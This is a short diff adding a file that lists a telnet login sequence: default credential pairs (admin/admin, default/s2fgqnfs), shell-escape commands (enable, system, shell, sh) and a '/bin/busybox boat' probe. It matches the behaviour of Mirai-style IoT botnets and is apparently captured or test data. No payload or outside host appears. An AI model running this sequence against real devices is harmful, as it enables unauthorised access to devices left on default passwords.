@@ -1,0 +1,15 @@
+admin
+admin
+enable
+
+system
+shell
+sh
+default
+s2fgqnfs
+enable
+
+system
+shell
+sh
+/bin/busybox boat
